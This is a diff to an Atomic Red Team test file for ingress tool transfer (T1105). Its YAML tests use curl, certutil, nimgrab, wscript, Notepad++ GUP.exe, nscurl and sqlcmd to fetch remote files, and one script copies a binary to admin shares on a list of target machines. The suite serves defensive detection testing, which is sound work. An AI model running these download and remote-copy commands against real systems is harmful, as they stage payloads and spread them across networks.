@@ -25,10 +25,19 @@ atomic_tests:
       description: User account to authenticate on remote host
       type: string
       default: victim
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      rsync must be installed on the machine 
+    prereq_command: |
+      if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      (pkg install -y rsync)||(sudo apt-get -y install rsync)
   executor:
     command: |
       rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
-    name: bash
+    name: sh
+    elevation_required: true
 - name: rsync remote file copy (pull)
   auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
   description: |
@@ -53,10 +62,18 @@ atomic_tests:
       description: User account to authenticate on remote host
       type: string
       default: adversary
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      rsync must be installed on the machine 
+    prereq_command: |
+      if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      (pkg install -y rsync)||(sudo apt-get -y install rsync)
   executor:
     command: |
       rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
-    name: bash
+    name: sh
 - name: scp remote file copy (push)
   auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
   description: |
@@ -84,7 +101,7 @@ atomic_tests:
   executor:
     command: |
       scp #{local_file} #{username}@#{remote_host}:#{remote_path}
-    name: bash
+    name: sh
 - name: scp remote file copy (pull)
   auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
   description: |
@@ -112,7 +129,7 @@ atomic_tests:
   executor:
     command: |
       scp #{username}@#{remote_host}:#{remote_file} #{local_path}
-    name: bash
+    name: sh
 - name: sftp remote file copy (push)
   auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
   description: |
@@ -140,7 +157,7 @@ atomic_tests:
   executor:
     command: |
       sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
-    name: bash
+    name: sh
 - name: sftp remote file copy (pull)
   auto_generated_guid: 0139dba1-f391-405e-a4f5-f3989f2c88ef
   description: |
@@ -168,7 +185,7 @@ atomic_tests:
   executor:
     command: |
       sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
-    name: bash
+    name: sh
 - name: certutil download (urlcache)
   auto_generated_guid: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
   description: |
@@ -321,7 +338,7 @@ atomic_tests:
   - description: 'Must have a Windows Defender version with MpCmdRun.exe installed'
     prereq_command: |
       cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
-      MpCmdRun.exe /?
+      MpCmdRun.exe /?  >nul 2>&1
     get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
   executor:
     command: |
@@ -460,11 +477,11 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{curl_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
-      Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
-      Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
-      Remove-Item $env:temp\curl
-      Remove-Item $env:temp\curl.zip
+      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
   executor:
     command: |
       #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
@@ -505,11 +522,11 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{curl_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest “https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip” -Outfile $env:temp\curl.zip
-      Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
-      Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
-      Remove-Item $env:temp\curl
-      Remove-Item $env:temp\curl.zip
+      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
   - description: |
       A file must be created to upload
     prereq_command: |
@@ -547,13 +564,13 @@ atomic_tests:
   - description: |
       #{Path_to_file} must exist on system.
     prereq_command: |
-      if (Test-Path #{Path_to_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{Path_to_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{Path_to_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{Path_to_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "#{Path_to_file}"
   executor:
     command: |
-      #{Path_to_file} 1>NUL 
+      "#{Path_to_file}" 1>NUL 
     cleanup_command: |
       del /f/s/q %temp%\T1105 >nul 2>&1
       rmdir /s/q %temp%\T1105 >nul 2>&1
@@ -589,17 +606,18 @@ atomic_tests:
     get_prereq_command: |
       write-host "The binary_file input parameter must be set to a binary that exists on this computer."
   - description: |
-      Machine list must exist at specified location ("$env:temp\T1105MachineList.txt")
+      Machine list must exist at specified location ("PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt")
     prereq_command: |
-      if (Test-Path "$env:temp\T1105MachineList.txt") {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {exit 1}
     get_prereq_command: |
-      new-item -path "$env:temp\T1105MachineList.txt"
-      echo "A machine list file has been generated at "$env:temp\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      new-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
+      echo "A machine list file has been generated at "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
   executor:
     command: |
-      $machine_list = "$env:temp\T1105MachineList.txt"
-      $offline_list = "$env:temp\T1105OfflineHosts.txt"
-      $completed_list = "$env:temp\T1105CompletedHosts.txt"
+      $machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"
+      $offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"
+      $completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"
       foreach ($machine in get-content -path "$machine_list")
       {if (test-connection -Count 1 -computername $machine -quiet) 
       {cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
@@ -608,12 +626,12 @@ atomic_tests:
       else
       {echo $machine >> "$offline_list"}}
     cleanup_command: |
-      if (test-path "$env:temp\T1105CompletedHosts.txt") 
-      {foreach ($machine in get-content -path "$env:temp\T1105CompletedHosts.txt")
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt") 
+      {foreach ($machine in get-content -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt")
       {wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
       Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
-      Remove-Item -path "$env:temp\T1105OfflineHosts.txt" -erroraction silentlycontinue
-      Remove-item -path "$env:temp\T1105CompletedHosts.txt" -erroraction silentlycontinue
+      Remove-Item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
+      Remove-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue
     name: powershell
 
 - name: Printer Migration Command-Line Tool UNC share folder into a zip file
@@ -660,14 +678,14 @@ atomic_tests:
   - description: |
       #{replace_cab} must exist on system.
     prereq_command: |
-      if (Test-Path #{replace_cab}) {exit 0} else {exit 1}
+      if (Test-Path "#{replace_cab}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{replace_cab}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{replace_cab}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "#{replace_cab}"
   executor:
     command: |
       del %TEMP%\redcanary.cab >nul 2>&1
-      #{Path_replace} #{replace_cab} %TEMP% /A
+      #{Path_replace} "#{replace_cab}" %TEMP% /A
     cleanup_command: |
       del %TEMP%\redcanary.cab >nul 2>&1
     name: command_prompt
@@ -730,12 +748,13 @@ atomic_tests:
   - description: |
       #{vbscript_file} must be exist on system.
     prereq_command: |
-      if (Test-Path #{vbscript_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{vbscript_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{vbscript_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{vbscript_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "#{vbscript_file}"
   executor:
-    command: 'wscript.exe #{vbscript_file}'
+    command: |
+      wscript.exe "#{vbscript_file}"
     cleanup_command: del Atomic-License.txt >nul 2>&1
     name: command_prompt
 - name: Linux Download File and Run
@@ -774,13 +793,9 @@ atomic_tests:
       description: Destination path to file
       type: path
       default: $env:TEMP\Atomic-license.txt
-    local_nimgrab:
-      description: Local path to nimgrab
-      type: path
-      default: $env:TEMP\nimgrab.exe
   executor:
     command: |
-      cmd /c nimgrab.exe #{remote_file} #{destination_path}
+      cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
     cleanup_command: |
       del #{destination_path} >nul 2>&1
     name: command_prompt
@@ -789,13 +804,12 @@ atomic_tests:
   - description: |
       NimGrab must be installed on system.
     prereq_command: |
-      if (Test-Path "#{local_nimgrab}") {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile $env:temp\nim.zip
-      Expand-Archive -Path $env:temp\nim.zip -DestinationPath $env:temp\nim -Force
-      Copy-Item $env:temp\nim\nim-1.6.6\bin\nimgrab.exe #{local_nimgrab}
-      Remove-Item $env:temp\nim
-      Remove-Item $env:temp\nim.zip
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\nim.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\nim.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\nim" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe" "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"
 - name: iwr or Invoke Web-Request download
   auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
   description: |
@@ -817,4 +831,92 @@ atomic_tests:
     cleanup_command: |
       del %temp%\Atomic-license.txt >nul 2>&1
     name: command_prompt
+    elevation_required: true
+- name: Arbitrary file download using the Notepad++ GUP.exe binary
+  auto_generated_guid: 66ee226e-64cb-4dae-80e3-5bf5763e4a51
+  description: |-
+    GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
+    [Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
+    Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_file_url:
+      description: 'URL of the target ZIP file (Eg: https://example.com/test.zip)'
+      type: url
+      default: https://getsamplefiles.com/download/zip/sample-2.zip
+    working_dir:
+      description: The directory where GUP.exe & it's dependecies exists
+      type: path
+      default: PathToAtomicsFolder\T1105\bin\
+    gup_executable:
+      description: GUP is an open source signed binary used by Notepad++ for software updates
+      type: String
+      default: PathToAtomicsFolder\T1105\bin\GUP.exe
+    target_file_sha256:
+      description: SHA256 value of target ZIP file
+      type: string
+      default: CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
+    prereq_command: if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe" -OutFile "#{gup_executable}"
+  executor:
+    command: |-
+      mkdir "c:\Temp"
+      cd #{working_dir}
+      GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
+    cleanup_command: rmdir /s /q "C:\Temp\Sample" >nul 2>nul
+    name: command_prompt
+    elevation_required: true
+- name: File download via nscurl
+  auto_generated_guid: 5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c
+  description: |
+     Use nscurl to download and write a file/payload from the internet.
+     -k = Disable certificate checking
+     -o = Output destination
+  supported_platforms:
+  - macos
+  input_arguments:
+    remote_file:
+      description: URL of remote file to download
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    destination_path:
+      description: Local path to place remote file
+      type: path
+      default: license.txt
+  executor:
+    command: nscurl -k "#{remote_file}" -o "#{destination_path}"
+    cleanup_command: rm "#{destination_path}"
+    name: sh
+    elevation_required: false
+- name: File Download with Sqlcmd.exe 
+  auto_generated_guid: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
+  description: |-
+    One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers
+    This Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: URL of the C2 Server from where file/s need to be downloaded
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
+    local_file_path:
+      description: The local file path along with filename to where the file needs to be downloaded and placed.
+      type: path
+      default: C:\T1105.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully
+    prereq_command: if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}
+    get_prereq_command: winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null
+  executor:
+    command: 'sqlcmd -i #{remote_url} -o #{local_file_path}'
+    cleanup_command:  rm "#{local_file_path}" 2>$null | Out-Null
+    name: powershell
     elevation_required: true
